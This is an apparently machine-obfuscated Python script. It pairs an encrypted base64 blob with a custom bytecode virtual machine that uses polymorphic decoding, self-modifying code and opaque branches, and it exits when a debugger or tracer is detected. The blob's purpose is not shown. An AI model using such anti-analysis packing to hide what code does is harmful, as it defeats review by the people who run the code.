#!/usr/bin/env python3
def _epokibzgo(_jdqemary):
    return _jdqemary % 2443 + 1

import hashlib as _auhmzd, hmac as _yzckkmf, base64 as _qzhvynqq, sys as _yaznywca, zlib as _jmrpysoac
_jdqemary = 504852
_migejpbhf = """ktlAdqcDef8T07rJvj3pzPLqP36gmDg9/F8kqzYxtBlBUfX8Emd2ajCEEqsvYftmu4pPDKQd4BaZn/fB29XOjkSeDJJM1ptnHf0MP9+4tQrBbuRAZUfi83N17omqwgJ9aJ8a51tMEXrRkdR1zeChJuDSMe73037hY/MWIVx/8wn2xsukhlnQGpGA/OcwYpBazR8TspGM876Gqg+aao3Q2uhIAM5SZPArcRTvAxIl7sMq23D8BvqVDtyhMB4E8lIJa1o/TXRqEoOIAQTg574Z3yu9SWrxWozhbn4W4QogtV/laZNlR5OEsF8+SuRSrdQjJfVINcQL3OT/K5S7DHw/ii7yiZtDzlhOS7eAL/PPCedX4UTBJjtQtM0HYy/ROLFAFR1QcvowrGpue2kNUPz0E+kH/8H2/z+1ufjDqmEGBRANDTx9E++rVB8o1jwCZKxTHhGaKtcPgKGq8zIu+gnmto/ecAAFiMEjVCfpDM4PqCDx3sd6CpV+NACsqRcwOIpK/IcQSoVDWeZ8aM9Biugz5n+p+LwuTHZLROhjjEi9jHII99U6cxg8dZ+9m59OQZ2asQ5HcfEsyvRM61ld5AEGIQwLcBp3m0YSVTHv5iJMjMfAZKoaJhS/89ukWuM2+7HFS9fMUL9YxY+5Hi4pTVTE8RfHSFCShRvaa9FU4nejwImVAkarEd/8rp0qq7wJ+X8Gkz3oglEq2tldGkPiDE5cDXGAckq5tUhu2o7wFom3uiqoBdAvXUv9h/6ythevsNcA3OhuRtTnQ2YWpIPiSfntpiABZykI9xC9bGisJ4r+Mje7BRltTNVamCuhMJBVDaWvlXi1YGsCFPXy+cdyrZy8VnZYwDXDDzw1QHkhaxgtmSEha0GdOMXYYtmOYqondE1Hd/0SWWOE46qWZFEKjqDsXT1DIQ=="""
_zjsbjgb = 3
_ydevgq = _epokibzgo(_jdqemary)

def _vm_decode_vl(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        _op = _m[_tag & 0x0F]
        _rd = _rm[(_c[_p+1] >> 4) & 0x0F] if _c[_p+1] < 64 else 0
        _rs1 = _rm[_c[_p+1] & 0x0F] if (_c[_p+1] & 0x0F) < 64 else 0
        return _op, _rd, _rs1, 0, 0, 2
    elif _cls == 1:
        _op = _m[_tag & 0x1F]
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _rd = _rm[(_b1 >> 4) & 0x0F] if ((_b1 >> 4) & 0x0F) < 64 else 0
        _rs1 = _rm[_b1 & 0x0F] if (_b1 & 0x0F) < 64 else 0
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _imm = _b2 | (_b3 << 8)
        if _imm & 0x8000:
            _imm = _imm | (-1 << 16)
        return _op, _rd, _rs1, 0, _imm, 4
    elif _cls == 2:
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
        _op = _m[_b1 & 0xFF]
        _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
        _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
        _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        return _op, _rd, _rs1, _rs2, _imm, 9
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

# Polymorphic decoder (handles variant detection)
def _vm_decode_poly(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        # Short class — try variants
        if _p + 2 <= len(_c) and (_p + 2 >= len(_c) or (_c[_p+2] ^ _k[(_p+2) % 32]) & 0xC0 == 0):
            # Variant 0 (standard 2B) or detect by checking if next byte looks valid
            _rd_raw = (_c[_p+1] ^ _k[(_p+1) % 32])
            _rd = _rm[(_rd_raw >> 4) & 0x0F] if (_rd_raw >> 4 & 0x0F) < 64 else 0
            _rs1 = _rm[_rd_raw & 0x0F] if (_rd_raw & 0x0F) < 64 else 0
            return _m[_tag & 0x0F], _rd, _rs1, 0, 0, 2
        if _p + 3 <= len(_c):
            # Variant 1 (3B interleaved)
            # Encoding: tag bits 3-2=rd[1:0], tag bits 1-0=op[3:2]
            #           out[1] bits 7-6=op[1:0], bits 5-2=rs1[3:0], bits 1-0=rd[4:3]
            #           out[2] bits 3-0=op[7:4]
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _op_v1 = ((_b2 & 0x0F) << 4) | ((_tag & 0x03) << 2) | ((_b1 >> 6) & 0x03)
            _rd_v1 = ((_b1 & 0x03) << 2) | ((_tag >> 2) & 0x03)
            _rs1_v1 = (_b1 >> 2) & 0x0F
            if _rd_v1 < 64:
                return _m[_op_v1 & 0xFF], _rm[_rd_v1] if _rd_v1 < 64 else 0, _rm[_rs1_v1] if _rs1_v1 < 64 else 0, 0, 0, 3
            # Variant 2 (3B scattered)
            _scat = _tag & 0x0F
            _op_lo2 = (_b1 >> 6) & 0x03
            _rd_bits = (_b1 >> 2) & 0x0F
            _rs1_hi2 = _b1 & 0x03
            _rs1_lo2 = (_b2 >> 6) & 0x03
            _scat_hi = (_b2 >> 2) & 0x0F
            _op_hi2 = _b2 & 0x30
            _op2 = ((_scat_hi << 4) | _op_hi2 | _op_lo2) & 0xFF
            _rs1_val = (_rs1_hi2 << 2) | _rs1_lo2
            if _rd_bits < 64:
                return _m[_op2], _rm[_rd_bits], _rm[_rs1_val] if _rs1_val < 64 else 0, 0, 0, 3
        # Fallback
        return _m[_tag & 0x0F], 0, 0, 0, 0, 2
    elif _cls == 1:
        # Medium class — use tag bit 5 for disambiguation
        _vbit = (_tag & 0x20) != 0
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _rd0 = (_b1 >> 4) & 0x0F
        _rs1_0 = _b1 & 0x0F
        if _p + 4 <= len(_c) and not _vbit:
            # Variant 0 (standard, bit 5 = 0)
            _op0 = _tag & 0x1F
            _imm0 = _b2 | (_b3 << 8)
            if _imm0 & 0x8000:
                _imm0 = _imm0 | (-1 << 16)
            return _m[_op0], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm0, 4
        elif _vbit and _p + 4 <= len(_c):
            # Variant 1 (imm in tag, bit 5 = 1)
            _op1 = (_b3 >> 3) & 0x1F
            _imm_lo = _tag & 0x1F
            _imm_hi = (_b2 | ((_b3 & 0x07) << 8))
            _imm1 = (_imm_hi << 5) | _imm_lo
            if _imm1 & 0x8000:
                _imm1 = _imm1 | (-1 << 16)
            return _m[_op1], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm1, 4
        # Fallback
        return 0, 0, 0, 0, 0, 2
    elif _cls == 2:
        # Long class
        _variant = (_tag >> 2) & 0x0F
        if _variant == 0 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 1 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b2 & 0xFF]
            _rd = _rm[_b1 & 0x3F] if (_b1 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 2 and _p + 10 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _i0 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i1 = _c[_p+8] ^ _k[(_p+8) % 32]
            _i2 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i3 = _c[_p+6] ^ _k[(_p+6) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 10
        # Fallback
        if _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        return 0, 0, 0, 0, 0, 2
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key, _vl_flag, _poly_flag=False):
    import sys
    if sys.gettrace() is not None: sys.exit(1)
    if any(x in globals() for x in ['pdb', 'inspect', 'trace']): sys.exit(1)
    import random
    _reg_map = list(range(64))
    random.shuffle(_reg_map)
    _r = [None] * 64
    _ip = 0
    _cycle = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    _spill_stack = []
    _handler_stack = []
    _vm_flags = 0
    _smc_key = random.getrandbits(32)
    if _poly_flag:
        _decode = lambda: _vm_decode_poly(_code, _ip, _op_key, _map, _reg_map)
    elif _vl_flag:
        _decode = lambda: _vm_decode_vl(_code, _ip, _op_key, _map, _reg_map)
    while _ip < _n:
        _cycle += 1
        if _poly_flag or _vl_flag:
            _op, _rd, _rs1, _rs2, _imm, _ilen = _decode()
        else:
            _raw = _code[_ip:_ip+8]
            _dec = bytes([_raw[i] ^ _op_key[i % 32] for i in range(len(_raw))])
            _op = _map[_dec[0]]
            _rd = _reg_map[_dec[1]]
            _rs1 = _reg_map[_dec[2]]
            _rs2 = _reg_map[_dec[3]]
            _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
            _ilen = 8
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            if _vl_flag:
                _ip = _imm
            else:
                _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 32:
            if not _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*[_r[_rs1 + _i] for _i in range(_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 44:
            _r[_rd] = list(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if not (_v + 1 == _v): pass
                elif _imm == 1:
                    if not (_v != _v): pass
                else:
                    if not (_v - 1 == _v): pass
            except TypeError:
                pass
        elif _op == 53:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if _v * 0 != 0: pass
                elif _imm == 1:
                    if _v != _v: pass
                else:
                    if _v + 1 == _v: pass
            except TypeError:
                pass

        # ─── Indirect & Virtual Call ───
        elif _op == 80:
            _fn = _r[_rs1]
            _argc = _imm & 0xFFFF
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_argc))
            _r[_rd] = _fn(*_args)
        elif _op == 81:
            _obj = _r[_rs1]
            _vtable = _r[_rs1 + 1]
            _midx = _imm & 0xFFFF
            _argc = (_imm >> 16) & 0xFFFF
            _method = _vtable[_midx]
            _args = tuple(_r[_rs1 + 2 + _i] for _i in range(_argc))
            _r[_rd] = _method(_obj, *_args)

        # ─── Exception Handling ───
        elif _op == 90:
            _handler_stack.append({'s': _ip, 'e': _ip + _imm, 'c': None, 't': None})
        elif _op == 91:
            if _handler_stack:
                _handler_stack[-1]['t'] = _r[_rd]
                _handler_stack[-1]['c'] = _ip + _ilen
        elif _op == 92:
            _exc = _r[_rs1]
            _found = False
            for _h in reversed(_handler_stack):
                if _h['s'] <= _ip <= _h['e']:
                    if _h['t'] is None or isinstance(_exc, _h['t']):
                        _ip = _h['c']
                        _r[_rs1] = _exc
                        _found = True
                        break
            if not _found:
                raise _exc
            continue
        elif _op == 93:
            if _handler_stack:
                _handler_stack.pop()

        # ─── Obfuscated Conditional Branching ───
        elif _op == 100:
            _v = _r[_rd]
            _t1 = (_v & _v) | _v
            _t2 = (_t1 ^ 0) + 0
            _t3 = _t2 ^ _t2
            if _t3 == 0:
                if _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 101:
            _v = _r[_rd]
            _t1 = _v | 0
            _t2 = _t1 & _t1
            if (_t2 ^ _t2) == 0:
                if not _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 102:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rd] ^ _r[_rd] if isinstance(_r[_rd], int) else 0
            if _o == 0:
                if _d == 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 103:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _m = _r[_rd] | 0 if isinstance(_r[_rd], int) else 0
            if _m == _m:
                if _d != 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 104:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _t = (_d ^ _d) & 0
            if _t == 0:
                if _d < 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 105:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rs1] ^ _r[_rs1] if isinstance(_r[_rs1], int) else 0
            if _o == 0:
                if _d <= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 106:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            if (_d * 0) == 0:
                if _d > 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 107:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _v = _r[_rd] & 0xFFFFFFFF if isinstance(_r[_rd], int) else 0
            if (_v ^ _v) == 0:
                if _d >= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 108:
            _target = _r[_rd]
            if isinstance(_target, int) and 0 <= _target < _n:
                _ip = _target
            else:
                _ip = 0
            continue
        elif _op == 109:
            _idx = _r[_rd]
            _table_base = _imm & 0xFFFF
            _default_off = (_imm >> 16) & 0xFFFF
            _num_entries = _rs1 & 0xFF
            if isinstance(_idx, int) and 0 <= _idx < _num_entries:
                _entry_off = _table_base + _idx * 4
                if _entry_off + 4 <= _n:
                    _off = (_code[_entry_off] | (_code[_entry_off+1] << 8) | (_code[_entry_off+2] << 16) | (_code[_entry_off+3] << 24))
                    _ip += _off
                else:
                    _ip += _default_off
            else:
                _ip += _default_off
            continue

        # ─── Register Spilling ───
        elif _op == 120:
            _spill_stack.append(_r[_rd])
        elif _op == 121:
            if _spill_stack:
                _r[_rd] = _spill_stack.pop()
        elif _op == 122:
            _mask = _imm & 0xFFFF
            for _b in range(16):
                if _mask & (1 << _b):
                    _reg = _rd + _b
                    if _reg < 64 and _reg < len(_r):
                        _spill_stack.append(_r[_reg])
                        _r[_reg] = None
        elif _op == 123:
            _cnt = _imm & 0xFF
            for _ in range(min(_cnt, len(_spill_stack))):
                _spill_stack.pop()

        # ─── Self-Modifying Code ───
        elif _op == 130:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _ks = _key.to_bytes(8, 'little')
                    for _i in range(min(_plen, 8)):
                        _code[_off + _i] ^= _ks[_i % len(_ks)]
        elif _op == 131:
            _shuf = _rd & 0xFF
            _new_op = _rs1 & 0xFF
            if _shuf < 256:
                _map[_shuf] = _new_op
        elif _op == 132:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF
        elif _op == 133:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF

        # ─── Data Obfuscation ───
        elif _op == 140:
            _v = _r[_rs1]
            _t = (_v ^ _v) & 0
            _r[_rd] = _t | _v
        elif _op == 141:
            _v = _r[_rs1] + _r[_rs2]
            _m = _r[_rs1] ^ _r[_rs2]
            _r[_rd] = _v + _m - _m
        elif _op == 142:
            _v = _r[_rs1]
            _k = _r[_rs2]
            if isinstance(_v, int) and isinstance(_k, int):
                _r[_rd] = (_v | _k) - (_v & _k) + (_v & _k) - (_v | _k) + (_v ^ _k)
            else:
                _r[_rd] = _v

        # ─── Control Flow Integrity (opcodes 150-152) ───
        elif _op == 150:
            _exp_lo = _rd & 0xFF
            _exp_mid = _rs1 & 0xFF
            _exp_hi = _rs2 & 0xFF
            _exp_top = (_imm >> 24) & 0xFF if _imm < 0 else (_imm >> 24) & 0xFF
            _expected = _exp_lo | (_exp_mid << 8) | (_exp_hi << 16) | (_exp_top << 24)
            _csum = 0xFFFFFFFF
            _start = _ip - _ilen if _ip >= _ilen else 0
            _end = _ip + 1
            for _ci in range(_start, min(_end, len(_code))):
                _csum ^= _code[_ci]
                _csum = ((_csum << 7) | (_csum >> 25)) & 0xFFFFFFFF
                _csum ^= (_csum >> 13)
            _csum ^= 0xFFFFFFFF
            if (_csum & 0xFFFFFFFF) != (_expected & 0xFFFFFFFF):
                import sys
                sys.stderr.write('error: CFI violation detected\\n')
                sys.exit(1)
        elif _op == 151:
            import sys
            sys.stderr.write('error: integrity failure\\n')
            sys.exit(1)
        elif _op == 152:
            pass

        # ─── Constant Decryption (opcode 160) ───
        elif _op == 160:
            _r[_rd] = _consts[_imm]
            if isinstance(_r[_rd], str):
                pass

        _ip += _ilen

def _vm_decode_fixed(_c, _p, _k, _m, _rm):
    _raw = _c[_p:_p+8]
    _dec = bytes([_raw[i] ^ _k[i % 32] for i in range(len(_raw))])
    _op = _m[_dec[0]]
    _rd = _rm[_dec[1] & 0x3F] if (_dec[1] & 0x3F) < 64 else 0
    _rs1 = _rm[_dec[2] & 0x3F] if (_dec[2] & 0x3F) < 64 else 0
    _rs2 = _rm[_dec[3] & 0x3F] if (_dec[3] & 0x3F) < 64 else 0
    _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
    return _op, _rd, _rs1, _rs2, _imm, 8

def _vm_deserialize(_data):
    import struct
    _op_key = _data[:32]
    _decrypted = _data[32:]
    _map = list(_decrypted[:256])
    _flags = int.from_bytes(bytes(_map[252:256]), 'little')
    _vl_flag = (_flags & 1) != 0
    _poly_flag = (_flags & 8) != 0
    _const_enc = (_flags & 2) != 0
    _cfi_flag = (_flags & 4) != 0
    _pos = 256
    
    # Read constant encryption key (16 bytes if encrypted)
    _const_key = None
    if _const_enc:
        _const_key = _decrypted[_pos:_pos+16]; _pos += 16
    
    # Skip CFI table (if present)
    if _cfi_flag:
        _cfi_nb = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        for _ in range(_cfi_nb):
            _pos += 12  # skip start(4) + len(4) + csum(4)
    
    # Constants (with optional decryption)
    _cc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _decrypted[_pos]; _pos += 1
        _sl = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _s = _decrypted[_pos:_pos+_sl]; _pos += _sl
        # Decrypt string constants (type 4) if encryption is enabled
        if _const_enc and _t == 4 and _const_key:
            _dec_bytes = bytearray(len(_s))
            for _j in range(len(_s)):
                _dec_bytes[_j] = _s[_j] ^ _const_key[_j % 16]
            _s = bytes(_dec_bytes)
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 7: _v = _s
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_decrypted[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_decrypted[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    if _vl_flag or _poly_flag:
        _code_sz = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_code_sz]
    else:
        _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_ic*8]
    return _code, _consts, _names, _map, _op_key, _vl_flag, _poly_flag


def _jgxmpce():
    if _yaznywca.gettrace() is not None:
        _yaznywca.stderr.write('error: debugger detected\n'); _yaznywca.exit(1)
